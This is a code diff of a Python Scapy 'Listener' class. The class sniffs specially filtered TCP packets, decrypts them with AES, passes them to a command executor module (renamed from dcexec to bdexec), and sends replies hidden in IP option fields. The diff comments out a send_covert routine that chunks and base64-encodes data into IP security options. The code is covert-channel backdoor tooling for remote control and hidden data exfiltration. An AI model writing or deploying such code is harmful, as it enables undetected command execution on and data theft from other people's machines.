@@ -1,9 +1,6 @@
 from scapy.all import *
-import dcexec
+import bdexec
 import netifaces
-import fcntl
-import socket
-import struct
 from dcaes import AESCipher
 
 
@@ -18,12 +15,11 @@ class Listener(object):
         self.chunk_length = 4
 
         self.cipher = AESCipher(self.key)
-        self.executor = dcexec.Executor()
+        self.executor = bdexec.Executor()
         self.executor.add_watches(watch_list)
 
         default_iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
         self.hw_addr = netifaces.ifaddresses(default_iface)[netifaces.AF_LINK][0]['addr']
-
 
     def listen(self):
         """
@@ -35,7 +31,6 @@ class Listener(object):
               ' and dst port ' + str(self.dport) + ' and src port ' + str(self.sport),
               lfilter=self.is_incoming,
               prn=self.sniff_packets)
-
 
     def sniff_packets(self, pkt):
         """
@@ -89,31 +84,30 @@ class Listener(object):
                             options=[ipoptions])/TCP(sport=self.sport, dport=self.dport)
             send(packet, verbose=False)
 
-
-    def send_covert(message, source, dest, chunk_length, encode):
-        chunks = [message[start:start + chunk_length] for start in xrange(0, len(message), chunk_length)]
-
-        ipoptions = IPOption()
-        ipoptions.optclass = 'control'
-        ipoptions.option = 'commercial_security'
-
-        for chunk in chunks:
-            if encode:
-                ipoptions.value = base64.b64encode(chunk)
-                ipoptions.length = len(base64.b64encode(chunk)) + 2
-            else:
-                ipoptions.value = chunk
-                ipoptions.length = len(chunk) + 2
-
-            pack = IP(src=source, dst=dest, options=[ipoptions])
-            send(pack, verbose=False)
-
-        # the security flag marks end of the message
-        ipoptions.option = 'security'
-        ipoptions.value = ''
-        ipoptions.length = 2
-        pack = IP(dst=dest, src=source, options=[ipoptions])
-        send(pack, verbose=False)
+    # def send_covert(message, source, dest, chunk_length, encode):
+    #     chunks = [message[start:start + chunk_length] for start in xrange(0, len(message), chunk_length)]
+    #
+    #     ipoptions = IPOption()
+    #     ipoptions.optclass = 'control'
+    #     ipoptions.option = 'commercial_security'
+    #
+    #     for chunk in chunks:
+    #         if encode:
+    #             ipoptions.value = base64.b64encode(chunk)
+    #             ipoptions.length = len(base64.b64encode(chunk)) + 2
+    #         else:
+    #             ipoptions.value = chunk
+    #             ipoptions.length = len(chunk) + 2
+    #
+    #         pack = IP(src=source, dst=dest, options=[ipoptions])
+    #         send(pack, verbose=False)
+    #
+    #     # the security flag marks end of the message
+    #     ipoptions.option = 'security'
+    #     ipoptions.value = ''
+    #     ipoptions.length = 2
+    #     pack = IP(dst=dest, src=source, options=[ipoptions])
+    #     send(pack, verbose=False)
 
     def is_incoming(self, pkt):
         # return pkt[Ether].src != self.get_hw_addr(self.default_iface)
